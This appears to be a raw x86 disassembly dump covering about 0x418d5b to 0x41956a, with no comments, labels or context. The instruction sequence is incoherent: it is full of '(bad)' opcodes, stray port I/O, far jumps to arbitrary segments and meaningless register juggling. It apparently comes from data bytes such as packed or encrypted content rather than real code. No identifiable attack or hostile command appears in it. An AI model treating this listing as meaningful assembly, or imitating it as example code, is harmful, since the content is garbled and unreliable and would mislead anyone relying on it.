  418d5b:	ins    DWORD PTR es:[edi],dx
  418d5c:	out    dx,al
  418d5d:	mov    eax,ds:0x147e69a4
  418d62:	or     DWORD PTR [edx-0x49],0x52
  418d66:	xchg   esi,eax
  418d67:	sbb    esp,DWORD PTR [edx-0x64e0147a]
  418d6d:	xchg   ecx,eax
  418d6e:	and    eax,0x30a8b519
  418d73:	pop    eax
  418d74:	jecxz  0x418d53
  418d76:	dec    eax
  418d77:	cmp    al,0xab
  418d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7a:	mov    ds:0x909a2bf4,eax
  418d7f:	in     al,0x2
  418d81:	and    bl,BYTE PTR [edi]
  418d83:	cmp    ecx,DWORD PTR [ebp+0x5f]
  418d86:	repz dec esp
  418d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d89:	xchg   BYTE PTR [edi-0x4c],cl
  418d8c:	or     ebp,DWORD PTR [edx]
  418d8e:	cmp    ch,dl
  418d90:	je     0x418d65
  418d92:	nop
  418d93:	shl    DWORD PTR [eax],0x65
  418d96:	into   
  418d97:	push   edi
  418d98:	lods   eax,DWORD PTR ds:[esi]
  418d99:	cdq    
  418d9a:	sbb    eax,0xc610614b
  418d9f:	aad    0xe7
  418da1:	or     BYTE PTR [edi],ah
  418da3:	or     dl,BYTE PTR [edx+0x5cca90d6]
  418da9:	pop    es
  418daa:	dec    ecx
  418dab:	lods   al,BYTE PTR ds:[esi]
  418dac:	adc    DWORD PTR [bp+di],0xd9b7c74a
  418db3:	xchg   BYTE PTR [ecx-0x639e9661],dh
  418db9:	repnz xor si,WORD PTR [ebp-0x44315e48]
  418dc1:	or     al,al
  418dc3:	dec    ecx
  418dc4:	stos   BYTE PTR es:[edi],al
  418dc5:	out    0x5b,al
  418dc7:	shl    BYTE PTR [ebp-0x69],cl
  418dca:	inc    esi
  418dcb:	into   
  418dcc:	stos   BYTE PTR es:[edi],al
  418dcd:	loop   0x418d96
  418dcf:	jae    0x418ddf
  418dd1:	sahf   
  418dd2:	sub    al,0xd
  418dd4:	xchg   edi,eax
  418dd5:	push   esp
  418dd6:	jb     0x418e1a
  418dd8:	rcr    ebp,0xd
  418ddb:	mov    ?,WORD PTR [ecx]
  418ddd:	pop    ss
  418dde:	loop   0x418de1
  418de0:	outs   dx,BYTE PTR ds:[esi]
  418de1:	dec    edi
  418de2:	nop
  418de3:	mov    ecx,0x9f958523
  418de8:	enter  0xd922,0x49
  418dec:	push   ecx
  418ded:	xor    cl,0xdb
  418df0:	cmp    ecx,ebp
  418df2:	jae    0x418da2
  418df4:	mov    esp,DWORD PTR [ebx+0x47b712bc]
  418dfa:	sahf   
  418dfb:	mov    al,ds:0xc9cdbaa2
  418e00:	inc    ebx
  418e01:	ficom  DWORD PTR [esi]
  418e03:	jp     0x418e44
  418e05:	(bad)  
  418e06:	aas    
  418e07:	dec    edx
  418e08:	test   DWORD PTR [esi+0x2a08c728],esp
  418e0e:	fnsave [edx-0x1d6f2aeb]
  418e14:	mov    al,ds:0x421b1849
  418e19:	(bad)  
  418e1a:	imul   eax,eax,0x2927df5e
  418e20:	add    eax,0xa57d639a
  418e25:	shl    DWORD PTR [ecx+0x675aa671],0x3e
  418e2c:	mov    ebx,DWORD PTR [edi-0x5d]
  418e2f:	icebp  
  418e30:	xor    eax,0xb74ec064
  418e35:	rcr    DWORD PTR ds:0x65cc2559,cl
  418e3b:	mov    edx,0xf4510f9b
  418e40:	xchg   ebx,eax
  418e41:	cld    
  418e42:	mov    ebp,0x9a1939ae
  418e47:	sbb    BYTE PTR [ecx-0x714f6f5b],0x11
  418e4e:	pop    ebp
  418e4f:	neg    ecx
  418e51:	(bad)  
  418e53:	adc    BYTE PTR [ebx-0x73],dh
  418e56:	fnstsw WORD PTR [ecx-0x30]
  418e59:	xchg   esi,eax
  418e5a:	fsub   QWORD PTR [edx]
  418e5c:	sub    dh,bl
  418e5e:	mov    al,ds:0x3939ce73
  418e63:	out    0x1d,al
  418e65:	rol    BYTE PTR [edx+ecx*2-0x78],cl
  418e69:	xor    eax,0x9f498561
  418e6e:	fld    st(4)
  418e70:	fwait
  418e71:	inc    ebx
  418e72:	jmp    0x418e4c
  418e74:	inc    esp
  418e75:	mov    edi,0xde71ada3
  418e7a:	mov    ?,WORD PTR es:0x50a3be29
  418e81:	pop    ds
  418e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e83:	cmc    
  418e84:	mov    ecx,ss
  418e86:	shl    BYTE PTR [ecx-0x25],1
  418e89:	sbb    ebp,0xcbfc2fca
  418e8f:	retf   
  418e90:	xchg   ebp,esi
  418e92:	test   DWORD PTR [ecx-0x30],0xbc575210
  418e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e9a:	js     0x418ea2
  418e9c:	adc    esp,eax
  418e9e:	nop
  418e9f:	xor    al,0x68
  418ea1:	add    bh,BYTE PTR ds:0x3e4a7532
  418ea7:	mov    ds:0xa990d6de,al
  418eac:	iret   
  418ead:	fwait
  418eae:	mov    BYTE PTR ds:0xfe086eb2,dl
  418eb4:	test   eax,0x430fb78f
  418eb9:	ds ret 0x48f4
  418ebd:	mov    bh,0xfd
  418ebf:	pop    eax
  418ec0:	pminub mm7,QWORD PTR [ecx+0x60]
  418ec4:	jnp    0x418ea2
  418ec6:	mov    eax,ds:0x4074aee8
  418ecb:	adc    bl,BYTE PTR [ebx+0x7b6de926]
  418ed1:	add    al,0xd6
  418ed3:	jmp    0xc102:0x34bde7c
  418eda:	mov    edx,0x8ffa0acb
  418edf:	pop    eax
  418ee0:	add    eax,0x4d1cf50b
  418ee5:	mov    ch,0xa
  418ee7:	pop    eax
  418ee8:	test   al,0x5a
  418eea:	dec    esi
  418eeb:	push   edx
  418eec:	sbb    ebx,edi
  418eee:	xchg   esi,eax
  418eef:	lea    ebx,[ebp+0x64b1c9e1]
  418ef5:	ficomp WORD PTR [eax]
  418ef7:	cs sbb edx,esi
  418efa:	lea    esi,[ecx+0x4301df95]
  418f00:	xchg   esi,ebp
  418f02:	pop    es
  418f03:	jge    0x418e85
  418f05:	(bad)  
  418f06:	stc    
  418f07:	push   ss
  418f08:	fwait
  418f09:	pop    ds
  418f0a:	js     0x418f14
  418f0c:	xor    eax,0x288dc77e
  418f11:	fimul  WORD PTR [edi+edi*4-0x2]
  418f15:	les    edx,FWORD PTR [edx-0x50]
  418f18:	mov    al,ds:0xf0c9072
  418f1d:	repnz pop ebp
  418f1f:	loop   0x418f93
  418f21:	xchg   ebp,eax
  418f22:	lea    ecx,[edx-0x7b]
  418f25:	test   al,0xc6
  418f27:	test   al,0x13
  418f29:	loop   0x418ec1
  418f2b:	in     eax,0xf7
  418f2d:	xor    BYTE PTR [eax-0x66],ah
  418f30:	test   al,0x28
  418f32:	nop
  418f33:	retf   0xf959
  418f36:	pop    ds
  418f37:	pop    edi
  418f38:	push   esi
  418f39:	fnstenv [edx+0x3591049]
  418f3f:	pop    eax
  418f40:	mov    al,ds:0x9b8098ed
  418f45:	outs   dx,DWORD PTR ds:[esi]
  418f46:	not    edx
  418f48:	mov    cl,0x5
  418f4a:	icebp  
  418f4b:	add    ebp,ebp
  418f4d:	(bad)  
  418f4f:	outs   dx,BYTE PTR ds:[esi]
  418f50:	or     DWORD PTR [esi+0x51],edx
  418f53:	cmp    BYTE PTR [ebx+0x21],cl
  418f56:	sahf   
  418f57:	es inc esp
  418f59:	mov    al,bl
  418f5b:	or     esi,eax
  418f5d:	mov    bh,0xb6
  418f5f:	loope  0x418f7f
  418f61:	fisubr WORD PTR [eax+0x69a2df45]
  418f67:	(bad)  
  418f69:	ins    DWORD PTR es:[edi],dx
  418f6a:	sub    BYTE PTR [eax+0x1988779b],0xd2
  418f71:	das    
  418f72:	ja     0x418f6f
  418f74:	pop    ecx
  418f75:	loope  0x418f82
  418f77:	shr    ebx,0x61
  418f7a:	lods   eax,DWORD PTR ds:[esi]
  418f7b:	cmp    eax,0x5b55e393
  418f80:	stos   BYTE PTR es:[edi],al
  418f81:	jnp    0x418fd4
  418f83:	inc    esp
  418f84:	pop    esi
  418f85:	shr    ebx,0x8c
  418f88:	jne    0x418f33
  418f8a:	outs   dx,BYTE PTR ds:[esi]
  418f8b:	cli    
  418f8c:	xor    DWORD PTR [eax],esp
  418f8e:	mov    DWORD PTR [eax-0x466f5dbe],ecx
  418f94:	retf   0x7f2e
  418f97:	pushf  
  418f98:	xor    eax,0x400c920a
  418f9d:	adc    eax,0x9df68545
  418fa2:	nop
  418fa3:	sahf   
  418fa4:	repnz (bad) 
  418fa7:	adc    cl,dh
  418fa9:	dec    edi
  418faa:	mov    ebx,0x908d5f45
  418faf:	mov    esi,0x31ec321a
  418fb4:	pop    ebp
  418fb5:	prefetcht0 BYTE PTR [edx+0x2f]
  418fb9:	pop    ebx
  418fba:	adc    dh,0x37
  418fbd:	pop    ds
  418fbe:	pop    edi
  418fbf:	aaa    
  418fc0:	pushf  
  418fc1:	pop    ds
  418fc2:	xchg   edx,eax
  418fc3:	scas   al,BYTE PTR es:[edi]
  418fc4:	mov    eax,ds:0xcbf67678
  418fc9:	sbb    cl,BYTE PTR [edx+ecx*2]
  418fcc:	jns    0x418fd2
  418fce:	bound  ecx,QWORD PTR [edi-0x4575d2d8]
  418fd4:	xchg   ebp,eax
  418fd5:	xchg   ebx,eax
  418fd6:	xchg   edx,eax
  418fd7:	sub    BYTE PTR [edx-0x3f664cd0],al
  418fdd:	sbb    eax,0xfa911f25
  418fe2:	enter  0x5beb,0x9e
  418fe6:	sbb    edx,ebx
  418fe8:	iret   
  418fe9:	cmc    
  418fea:	pusha  
  418feb:	es fwait
  418fed:	mov    eax,0x1c68d217
  418ff2:	xlat   BYTE PTR ds:[ebx]
  418ff3:	jne    0x419074
  418ff5:	cli    
  418ff6:	mov    cl,0xec
  418ff8:	mov    ebx,0x9df86d9d
  418ffd:	push   cs
  418ffe:	ror    BYTE PTR ds:0x83e2b49e,0x54
  419005:	out    dx,al
  419006:	(bad)  
  419008:	sbb    ebp,DWORD PTR [edi]
  41900a:	in     eax,dx
  41900b:	jle    0x41904a
  41900d:	fistp  WORD PTR [ecx-0x5d02030d]
  419013:	cld    
  419014:	gs mov esi,0xca0d71d5
  41901a:	nop
  41901b:	adc    eax,0x10dff28b
  419020:	fidivr DWORD PTR [ecx]
  419022:	stos   DWORD PTR es:[edi],eax
  419023:	sub    al,BYTE PTR [edi+0x1f49cadf]
  419029:	mov    dl,0x20
  41902b:	inc    edi
  41902c:	jecxz  0x418fb5
  41902e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41902f:	cwde   
  419030:	rcl    DWORD PTR [ecx+0x12],0x9d
  419034:	sbb    eax,0xb0333368
  419039:	ds jbe 0x419017
  41903c:	mov    esp,DWORD PTR [edi]
  41903e:	and    BYTE PTR [ecx+0x36],bl
  419041:	js     0x41906b
  419043:	repnz cmp edi,DWORD PTR [eax+0x4972b18c]
  41904a:	nop
  41904b:	cmp    eax,0xa9771cb2
  419050:	inc    esp
  419051:	cdq    
  419052:	inc    edi
  419053:	dec    edx
  419054:	(bad)  [edx-0x5165ed9b]
  41905a:	fist   DWORD PTR [ebx-0x64]
  41905d:	push   eax
  41905e:	push   edi
  41905f:	ja     0x419080
  419061:	(bad)  
  419062:	fnstenv [ebx]
  419064:	pop    edi
  419065:	stc    
  419066:	or     eax,0x378c484a
  41906b:	xlat   BYTE PTR ds:[ebx]
  41906c:	icebp  
  41906d:	gs inc ebp
  41906f:	xchg   BYTE PTR [esi-0x4e681486],ah
  419075:	in     al,0xcb
  419077:	pushf  
  419078:	sbb    BYTE PTR ds:[eax-0x16],bh
  41907c:	xchg   ebx,eax
  41907d:	test   DWORD PTR [eax],0xcf897468
  419083:	dec    ecx
  419084:	push   esi
  419085:	pusha  
  419086:	repnz aad 0xe1
  419089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41908a:	nop
  41908b:	leave  
  41908c:	jb     0x41905b
  41908e:	and    al,0xfc
  419090:	adc    eax,esp
  419092:	retf   
  419093:	mov    ebp,0x9fe0ddad
  419098:	xchg   edx,esi
  41909a:	mov    dh,dl
  41909c:	gs inc ebx
  41909e:	nop
  41909f:	or     al,0xd6
  4190a1:	and    BYTE PTR [ecx-0x37],dh
  4190a4:	test   al,0x75
  4190a6:	xor    BYTE PTR [esi],bh
  4190a8:	or     al,0xde
  4190aa:	xor    BYTE PTR [esi],dh
  4190ac:	and    al,0x68
  4190ae:	pop    eax
  4190af:	data16 in al,0x37
  4190b2:	nop
  4190b3:	inc    ebp
  4190b4:	or     eax,0x12c26985
  4190b9:	mov    cl,0xee
  4190bb:	dec    ecx
  4190bc:	jle    0x419128
  4190be:	cwde   
  4190bf:	repz js 0x4190de
  4190c2:	mov    esi,0xb275a24e
  4190c7:	dec    ebp
  4190c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c9:	xor    eax,0x2843e4d0
  4190ce:	add    al,0x4a
  4190d0:	dec    esi
  4190d1:	mov    edx,0xe6c720cb
  4190d6:	adc    al,0x30
  4190d8:	fwait
  4190d9:	adc    al,bl
  4190db:	mov    ah,ch
  4190dd:	stos   DWORD PTR es:[edi],eax
  4190de:	and    BYTE PTR [edi+0x3baa5a3b],bh
  4190e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190e5:	out    0x7,eax
  4190e7:	test   eax,0x4a2b986a
  4190ec:	jnp    0x41914d
  4190ee:	mov    eax,ds:0x91cd8006
  4190f3:	xor    eax,0x3da2071b
  4190f8:	and    eax,0xe1d74a3
  4190fd:	in     eax,0xea
  4190ff:	fld    st(6)
  419101:	sar    al,0xf9
  419104:	pop    es
  419105:	sub    eax,0x979eb819
  41910a:	push   ebx
  41910b:	mov    esp,0xf9d5b6c2
  419110:	call   0x1e237a46
  419115:	fisubr WORD PTR [ebx+0x37b43f56]
  41911b:	imul   ebx,DWORD PTR [ecx],0x7bf89081
  419121:	pushf  
  419122:	mov    esp,0xe501e6b0
  419127:	dec    esp
  419128:	mov    dl,BYTE PTR [edi]
  41912a:	push   esi
  41912b:	pop    ebp
  41912c:	dec    esp
  41912d:	gs inc ecx
  41912f:	cli    
  419130:	cwde   
  419131:	mov    edx,0xb29bb8eb
  419136:	bound  ebp,QWORD PTR [ecx-0x6208ee67]
  41913c:	cmp    esi,ebx
  41913e:	frstor [eax+0x50]
  419141:	push   ecx
  419142:	ja     0x41919b
  419144:	(bad)  
  419146:	nop
  419147:	jnp    0x419164
  419149:	(bad)  
  41914a:	ds (bad) 
  41914c:	mov    ds:0xed5f81f3,eax
  419151:	xchg   esp,eax
  419152:	sbb    DWORD PTR [esi],eax
  419154:	mov    bh,0xeb
  419156:	pop    ecx
  419157:	pop    eax
  419158:	imul   esi,DWORD PTR ds:0x4fee17b0,0x3b
  41915f:	mov    dh,0xe3
  419161:	and    al,0x3b
  419163:	dec    edx
  419164:	shl    esp,0x25
  419167:	out    0x61,eax
  419169:	popa   
  41916a:	rol    BYTE PTR [esi+esi*1+0x2c4cb7fb],0xbe
  419172:	clc    
  419173:	dec    ecx
  419174:	xchg   edi,eax
  419175:	cmp    ebx,ebx
  419177:	cmp    DWORD PTR [eax],ebx
  419179:	xchg   ebx,eax
  41917a:	popa   
  41917b:	add    DWORD PTR [ecx+edx*1-0x545e8711],ebx
  419182:	jmp    0x7436f93d
  419187:	dec    ebx
  419188:	mov    bl,0xb2
  41918a:	or     ebx,DWORD PTR [esi+0x7c]
  41918d:	jl     0x4191bf
  41918f:	stos   BYTE PTR es:[edi],al
  419190:	xchg   esp,eax
  419191:	hlt    
  419192:	push   es
  419193:	fistp  DWORD PTR [ebx+0x79152fae]
  419199:	xor    esp,DWORD PTR [edx+0x33de4800]
  41919f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191a0:	sub    DWORD PTR [edi],eax
  4191a2:	enter  0xeefe,0x22
  4191a6:	nop
  4191a7:	sub    al,0xaa
  4191a9:	sub    BYTE PTR [edx-0x45a2809],dl
  4191af:	dec    ecx
  4191b0:	out    0x72,eax
  4191b2:	jmp    0x5d60ebc2
  4191b7:	in     al,0x9b
  4191b9:	sub    dl,BYTE PTR [ebx]
  4191bb:	sbb    esp,ebx
  4191bd:	pop    edi
  4191be:	adc    DWORD PTR [edi+0x3e],ebx
  4191c1:	cli    
  4191c2:	repz sub eax,0xcfc6e250
  4191c8:	jns    0x419228
  4191ca:	mov    ecx,edi
  4191cc:	iret   
  4191cd:	dec    ebx
  4191ce:	xchg   edi,eax
  4191cf:	inc    ebx
  4191d0:	jmp    0xfe56720c
  4191d5:	mov    eax,ebx
  4191d7:	inc    edx
  4191d8:	sbb    BYTE PTR ds:0xfb1d6278,bl
  4191de:	outs   dx,BYTE PTR ds:[esi]
  4191df:	fstp   st(3)
  4191e1:	sub    al,0x43
  4191e3:	sar    BYTE PTR [ebx],cl
  4191e5:	jmp    0x419208
  4191e7:	fs jecxz 0x41918c
  4191ea:	into   
  4191eb:	sbb    al,0xf5
  4191ed:	fst    QWORD PTR [esi-0x51942559]
  4191f3:	pop    ss
  4191f4:	jnp    0x4191f3
  4191f6:	inc    ecx
  4191f7:	jmp    0x4191b0
  4191f9:	xchg   edi,eax
  4191fa:	nop
  4191fb:	std    
  4191fc:	inc    esp
  4191fd:	mov    esp,0x142a83bf
  419202:	nop
  419203:	mov    eax,DWORD PTR ss:[ebx+0x11287c69]
  41920a:	sti    
  41920b:	dec    ecx
  41920c:	and    esp,DWORD PTR es:[edi+eax*1-0x26f009db]
  419214:	fwait
  419215:	int3   
  419216:	inc    ebp
  419217:	test   al,0xa3
  419219:	xor    ch,BYTE PTR [edx+ebx*8-0xd]
  41921d:	jmp    0x419232
  41921f:	das    
  419220:	mov    eax,ds:0xb7745033
  419225:	cmp    cl,ch
  419227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419228:	fwait
  419229:	xor    BYTE PTR [ecx+0x623dd16a],bl
  41922f:	push   ebp
  419230:	jbe    0x419210
  419232:	sub    ebx,eax
  419234:	mov    ebx,0xc2951887
  419239:	in     al,dx
  41923a:	pop    esi
  41923c:	mov    cl,0x26
  41923e:	mov    eax,ds:0x6d230bab
  419243:	dec    edx
  419244:	adc    al,BYTE PTR [edi]
  419246:	inc    eax
  419247:	or     DWORD PTR [edi],eax
  419249:	ins    BYTE PTR es:[edi],dx
  41924a:	sub    al,BYTE PTR [edi+0x7f]
  41924d:	jmp    0xfabc81e1
  419252:	jle    0x41921b
  419254:	jns    0x41922b
  419256:	xchg   esp,eax
  419257:	dec    ecx
  419258:	mul    BYTE PTR [esi+0x14]
  41925b:	cmp    ecx,DWORD PTR [edi-0x3ec4358c]
  419261:	jmp    0x6c89:0xc99bb909
  419268:	jno    0x41924d
  41926a:	pop    eax
  41926b:	dec    edx
  41926c:	lods   eax,DWORD PTR ds:[si]
  41926e:	iret   
  41926f:	dec    edi
  419270:	pop    ds
  419271:	xor    BYTE PTR [ebp-0x1ee0649b],0xc0
  419278:	and    bh,BYTE PTR [ebp-0x2a]
  41927b:	imul   ecx,eax,0xd225ccdd
  419281:	in     eax,0x6f
  419283:	sbb    DWORD PTR [edi-0x3626e5c],edx
  419289:	xchg   esp,eax
  41928a:	push   esp
  41928b:	mov    bh,0xb2
  41928d:	nop
  41928e:	ins    BYTE PTR es:[edi],dx
  41928f:	xchg   edx,eax
  419290:	jbe    0x419270
  419292:	cmp    al,BYTE PTR [eax+0x2e]
  419295:	sbb    al,0x49
  419297:	jae    0x419290
  419299:	jmp    0x41922a
  41929b:	jecxz  0x41931b
  41929d:	pop    ebp
  41929e:	outs   dx,DWORD PTR ds:[esi]
  41929f:	push   0x2d
  4192a1:	in     eax,0x9a
  4192a3:	push   eax
  4192a4:	hlt    
  4192a5:	hlt    
  4192a6:	test   al,0x47
  4192a8:	addr16 mov esi,0x68d87a1
  4192ae:	nop
  4192af:	add    DWORD PTR [edx+0x1d2c144d],0x2052aebb
  4192b9:	dec    edx
  4192ba:	fsin   
  4192bc:	sbb    edx,DWORD PTR [ebx]
  4192be:	sbb    BYTE PTR [edx],bl
  4192c0:	jb     0x419268
  4192c2:	nop
  4192c3:	sbb    BYTE PTR [eax],0xef
  4192c6:	cmp    esi,DWORD PTR [ecx+0x5d3812ba]
  4192cc:	sbb    eax,0x4b4b0943
  4192d1:	push   esp
  4192d2:	mov    ds:0x6dd20465,eax
  4192d7:	mov    esi,0xda7e8e9e
  4192dc:	xor    dl,bl
  4192de:	mov    esi,0xe8311d3d
  4192e3:	mov    DWORD PTR [eax+esi*2+0x3e],eax
  4192e7:	mov    esi,0x9b42de26
  4192ec:	xor    eax,0xf7a918f3
  4192f1:	fisttp WORD PTR [edi+0x71242a10]
  4192f7:	(bad)  
  4192f8:	dec    edx
  4192f9:	sar    edi,0x49
  4192fc:	inc    ecx
  4192fd:	inc    ebp
  4192fe:	cld    
  4192ff:	retf   
  419300:	jecxz  0x419284
  419302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419303:	(bad)  
  419304:	popf   
  419305:	inc    eax
  419306:	loope  0x419379
  419308:	(bad)  
  419309:	cmp    eax,0x662fa9c6
  41930e:	lods   al,BYTE PTR ds:[esi]
  41930f:	inc    ecx
  419310:	fcomp  st(5)
  419312:	adc    eax,0xb262e808
  419317:	pop    edi
  419318:	xor    eax,0xdffc97a7
  41931d:	std    
  41931e:	sti    
  41931f:	enter  0x581b,0xab
  419323:	mov    edi,edi
  419325:	(bad)  [ebp-0x55cc55d9]
  41932b:	fsubp  st(4),st
  41932d:	dec    esi
  41932e:	nop
  41932f:	sbb    eax,0x861b004f
  419334:	adc    bl,BYTE PTR [ebx+0x743c4a19]
  41933a:	adc    ecx,DWORD PTR [ebx+0x486b9d69]
  419340:	sbb    BYTE PTR [eax+edx*4],dh
  419343:	dec    edi
  419344:	dec    eax
  419345:	loope  0x41931f
  419347:	xchg   dh,ah
  419349:	ins    BYTE PTR es:[edi],dx
  41934a:	je     0x41930a
  41934c:	out    dx,eax
  41934d:	fld    QWORD PTR [esi+0xa0401fb]
  419353:	out    dx,eax
  419354:	dec    edx
  419355:	test   BYTE PTR [eax+0x47989199],dl
  41935b:	mov    bh,0xfe
  41935d:	add    al,BYTE PTR [ebx]
  41935f:	pop    ebp
  419360:	ret    0x619e
  419363:	dec    edx
  419364:	popf   
  419365:	jne    0x41938b
  419367:	sbb    cl,BYTE PTR [ebx-0x17cc6fb3]
  41936d:	sbb    edi,DWORD PTR [eax-0x25]
  419370:	add    al,BYTE PTR [ebx+0x5d]
  419373:	addr16 pop dx
  419376:	cdq    
  419377:	dec    ecx
  419378:	in     al,dx
  419379:	xor    DWORD PTR [ebx],edx
  41937b:	les    edx,FWORD PTR [ebx-0x3396fb2]
  419381:	inc    ecx
  419382:	test   eax,0x49e6cf16
  419388:	or     BYTE PTR [edx],cl
  41938a:	das    
  41938b:	(bad)  
  41938c:	retf   0xdc63
  41938f:	xchg   esp,eax
  419390:	fwait
  419391:	sbb    ch,BYTE PTR [edi-0x55852ef0]
  419397:	cs push ss
  419399:	sbb    DWORD PTR [ebp+edi*2+0x1e],edi
  41939d:	inc    ecx
  41939e:	mov    WORD PTR [edx+ecx*4-0x231297d4],cs
  4193a5:	(bad)  
  4193a6:	xchg   edi,eax
  4193a7:	jae    0x419366
  4193a9:	test   eax,0xbdfed344
  4193ae:	jne    0x4193a2
  4193b0:	into   
  4193b1:	xor    ch,BYTE PTR [ebp-0x5282576f]
  4193b7:	adc    esp,0x79b4720
  4193bd:	sub    esi,DWORD PTR [eax]
  4193bf:	out    0x31,eax
  4193c1:	rol    DWORD PTR [esi-0x553c26a3],1
  4193c7:	dec    ecx
  4193c8:	dec    ebx
  4193c9:	inc    esi
  4193ca:	xor    eax,0x2223bbc9
  4193cf:	dec    edx
  4193d0:	mov    al,0x20
  4193d2:	inc    BYTE PTR [esi-0x662294c4]
  4193d8:	fwait
  4193d9:	add    DWORD PTR ds:0x18b2fa0,ebp
  4193df:	jmp    0x92f0:0x5aa4ddfa
  4193e6:	mov    edi,0xbca28444
  4193eb:	das    
  4193ec:	ins    BYTE PTR es:[edi],dx
  4193ed:	adc    eax,0x43bf2293
  4193f2:	inc    esp
  4193f3:	repz in eax,0xe6
  4193f6:	out    dx,eax
  4193f7:	inc    eax
  4193f8:	sub    esp,ebp
  4193fa:	ss or  al,0x9
  4193fd:	dec    ebx
  4193fe:	push   esi
  4193ff:	or     bl,BYTE PTR [ebx-0x1a]
  419402:	sbb    eax,0xc3c7ad19
  419407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419408:	test   eax,0x9629badd
  41940d:	or     al,BYTE PTR [eax]
  41940f:	mov    eax,0x4d77f194
  419414:	lock fucomp st(4)
  419417:	das    
  419418:	(bad)  
  41941b:	and    DWORD PTR [ebx+0x1959f401],ebx
  419421:	jp     0x4193cb
  419423:	pop    ds
  419424:	push   0xffffffde
  419426:	fst    QWORD PTR ds:0x74fefe2d
  41942c:	mov    fs,WORD PTR [edx]
  41942e:	nop
  41942f:	or     eax,0x7d14e30b
  419434:	ret    0x940c
  419437:	dec    ecx
  419438:	loope  0x4193cf
  41943a:	add    DWORD PTR [esi+0x31],0x9b950f2b
  419441:	mov    dl,0x3e
  419443:	cwde   
  419444:	enter  0x967f,0x28
  419448:	sub    edi,edx
  41944a:	das    
  41944b:	inc    ebx
  41944c:	neg    DWORD PTR [eax-0x65]
  41944f:	push   ebp
  419450:	dec    ebp
  419451:	xor    BYTE PTR [eax],dl
  419453:	or     DWORD PTR [esp+ecx*4-0xf6410f0],ebp
  41945a:	jbe    0x41944d
  41945c:	fisub  DWORD PTR [edi+0x5f]
  41945f:	daa    
  419460:	dec    eax
  419461:	cli    
  419462:	in     eax,dx
  419463:	sbb    al,0xa3
  419465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419466:	pushf  
  419467:	jne    0x41941f
  419469:	push   cs
  41946a:	xor    dh,BYTE PTR [ebx+0x49]
  41946d:	stos   BYTE PTR es:[edi],al
  41946e:	inc    ebx
  41946f:	pop    esp
  419470:	mov    edx,0x5b637ee4
  419475:	adc    ebp,DWORD PTR [edi]
  419477:	push   eax
  419478:	push   ebp
  419479:	inc    ebx
  41947a:	fs enter 0x5cb1,0xca
  41947f:	dec    ecx
  419480:	mov    edx,ecx
  419482:	sub    dh,dl
  419484:	xor    ebx,DWORD PTR es:[ecx+0x20]
  419488:	mov    bh,0xef
  41948a:	nop
  41948b:	out    0x9e,al
  41948d:	jecxz  0x41944b
  41948f:	fwait
  419490:	rcl    ebp,1
  419492:	push   ss
  419493:	stos   DWORD PTR es:[edi],eax
  419494:	xchg   esi,eax
  419495:	fisub  WORD PTR [esi-0x408b09e3]
  41949b:	fdivr  st,st(0)
  41949d:	outs   dx,DWORD PTR ds:[esi]
  41949e:	nop
  41949f:	pop    ebp
  4194a0:	fmul   DWORD PTR ds:0xc6860d10
  4194a6:	mov    WORD PTR [esi+0x2b],cs
  4194a9:	add    dh,BYTE PTR [esi+0x219e4691]
  4194af:	call   0x9fd19a4a
  4194b4:	int3   
  4194b5:	loop   0x4194fd
  4194b7:	imul   ebx,DWORD PTR ds:0x1349bc37,0xffffffcf
  4194be:	push   ecx
  4194bf:	fsubr  DWORD PTR [esi+edx*1]
  4194c2:	jne    0x419537
  4194c4:	test   eax,0xdd780b2d
  4194c9:	std    
  4194ca:	imul   edx,ebx,0x7
  4194cd:	in     eax,0x78
  4194cf:	imul   esi,DWORD PTR [eax-0x15],0x4173c9a4
  4194d6:	jmp    0x9ac3:0x9e302fec
  4194dd:	int    0xe0
  4194df:	sub    DWORD PTR [edx],esp
  4194e1:	lea    ecx,[eax+0x47]
  4194e4:	repnz (bad) 
  4194e7:	mov    ch,0xe
  4194e9:	inc    ebp
  4194ea:	xchg   esp,eax
  4194eb:	xchg   edx,eax
  4194ec:	mov    eax,ds:0x1d10904e
  4194f1:	out    dx,al
  4194f2:	or     BYTE PTR [ebp+0x49b3df3e],ah
  4194f8:	cld    
  4194f9:	mov    cl,0xae
  4194fb:	fild   WORD PTR [eax]
  4194fd:	inc    eax
  4194fe:	bound  ecx,QWORD PTR [edx+0x4902db9b]
  419504:	dec    ebp
  419505:	(bad)  
  419506:	and    ah,BYTE PTR [ebp+0x4efbddef]
  41950c:	mov    ecx,0x62a34bba
  419511:	or     al,BYTE PTR [edi]
  419513:	outs   dx,BYTE PTR ds:[esi]
  419514:	fwait
  419515:	inc    ecx
  419516:	push   edx
  419517:	stos   BYTE PTR es:[edi],al
  419518:	arpl   WORD PTR [eax-0x5c],sp
  41951b:	pop    edi
  41951c:	dec    edi
  41951d:	fdivp  st(6),st
  41951f:	jp     0x41952a
  419521:	leave  
  419522:	sub    dl,al
  419524:	xchg   esi,eax
  419525:	push   cs
  419526:	nop
  419527:	add    dl,BYTE PTR [edx+0x2ba220ec]
  41952d:	xor    eax,0x947a49df
  419532:	mov    ecx,0xdcd71f90
  419537:	into   
  419538:	fwait
  419539:	pop    ecx
  41953a:	sub    BYTE PTR [eax-0x6930e133],cl
  419540:	dec    ebx
  419541:	faddp  st(4),st
  419543:	or     edi,ebp
  419545:	hlt    
  419546:	jmp    0x2f7:0x925f2c17
  41954d:	xchg   DWORD PTR ds:[esi-0x7d794204],esp
  419554:	mov    bl,0xdd
  419556:	xchg   edi,eax
  419557:	mov    edx,0xf6cbae0a
  41955c:	pop    edi
  41955d:	ret    
  41955e:	push   cs
  41955f:	sbb    BYTE PTR [esi],dl
  419561:	call   0xbd0e:0x327bbe93
  419568:	ss scas al,BYTE PTR es:[edi]
  41956a:	cmp    dh,ch
